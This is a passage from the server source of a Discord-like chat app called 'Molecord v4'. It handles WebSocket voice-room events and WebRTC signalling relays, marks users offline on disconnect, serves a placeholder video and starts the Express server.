          broadcast(null, { type: 'VOICE_ROOM_UPDATE', channelId: d.channelId, serverId: d.serverId, participants: getVCP(d.channelId) });
          break;
        }
        case 'VOICE_LEAVE': {
          const room = voiceRooms.get(d.channelId);
          if (room) { room.delete(uid); if (!room.size) voiceRooms.delete(d.channelId); }
          broadcast(null, { type: 'VOICE_LEAVE', channelId: d.channelId, userId: uid, serverId: d.serverId });
          broadcast(null, { type: 'VOICE_ROOM_UPDATE', channelId: d.channelId, serverId: d.serverId, participants: getVCP(d.channelId) });
          break;
        }
        case 'VOICE_STATE': {
          const room = voiceRooms.get(d.channelId);
          if (room?.has(uid)) room.set(uid, { muted: d.muted, deafened: d.deafened, screensharing: d.screensharing, video: d.video, quality: d.quality || '720p' });
          broadcast(null, { type: 'VOICE_STATE_UPDATE', channelId: d.channelId, userId: uid, muted: d.muted, deafened: d.deafened, screensharing: d.screensharing, video: d.video });
          broadcast(null, { type: 'VOICE_ROOM_UPDATE', channelId: d.channelId, serverId: d.serverId, participants: getVCP(d.channelId) });
          break;
        }
        case 'RTC_OFFER': case 'RTC_ANSWER': case 'RTC_ICE':
          if (d.targetUserId) sendToUser(d.targetUserId, { ...d, fromUserId: uid });
          break;
      }
    } catch (_) {}
  });

  ws.on('close', () => {
    const uid = wsUsers.get(ws); wsUsers.delete(ws); if (!uid) return;
    const s = userSockets.get(uid); if (s) {
      s.delete(ws);
      if (!s.size) {
        userSockets.delete(uid);
        voiceRooms.forEach((room, chId) => { if (room.has(uid)) { room.delete(uid); const sv = db.prepare('SELECT server_id FROM channels WHERE id=?').get(chId); broadcast(null, { type: 'VOICE_LEAVE', channelId: chId, userId: uid, serverId: sv?.server_id }); broadcast(null, { type: 'VOICE_ROOM_UPDATE', channelId: chId, serverId: sv?.server_id, participants: getVCP(chId) }); } });
        db.prepare('UPDATE users SET status=? WHERE id=?').run('offline', uid);
        broadcast(null, { type: 'USER_STATUS', userId: uid, status: 'offline' });
      }
    }
  });
});

// Serve thug.mp4 if it exists, else redirect to a placeholder
app.get('/thug.mp4', (req, res) => {
  const p = path.join(__dirname, 'public', 'thug.mp4');
  if (fs.existsSync(p)) return res.sendFile(p);
  // If not uploaded yet, send a redirect to a publicly available video
  res.redirect('https://www.w3schools.com/html/mov_bbb.mp4');
});

app.get('*', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`\n🔵 Molecord v4 → http://localhost:${PORT}\n`));
